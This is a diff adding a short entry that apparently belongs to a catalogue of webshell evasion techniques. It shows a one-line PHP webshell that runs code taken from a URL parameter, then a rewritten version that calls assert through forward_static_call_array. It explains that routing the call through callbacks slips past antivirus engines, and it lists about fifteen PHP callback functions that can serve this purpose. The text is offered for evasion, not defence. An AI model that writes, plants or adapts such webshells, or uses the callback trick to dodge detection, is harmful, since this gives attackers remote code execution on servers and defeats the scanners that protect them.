@@ -1,0 +1,32 @@
+Original webshell sample:
+
+'''
+<?php assert($_GET['x']); ?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+forward_static_call_array('assert',array($_GET['x']));   ?>
+'''
+
+Description:
+
+This method makes use of callback functions in php, no longer calling sensitive functions such as "eval" directly, but bypassing the identification of the antivirus engine through calling callback functions. Although there are a large number of callback functions in php, such as 
+"call_user_func_array()"
+"call_user_func()"
+"array_filter()" 
+"array_walk()"  
+"array_map()"
+"array_reduce()"
+"array_walk()" 
+"array_walk_recursive()"
+"filter_var()" 
+"filter_var_array()" 
+"uasort()" 
+"uksort()" 
+"registregister_shutdown_function()"
+"register_tick_function()"
+"forward_static_call_array()",
+most of them are already recognized by the antivirus engine, so they often need to be used in conjunction with other methods, such as Bypass custom function. 
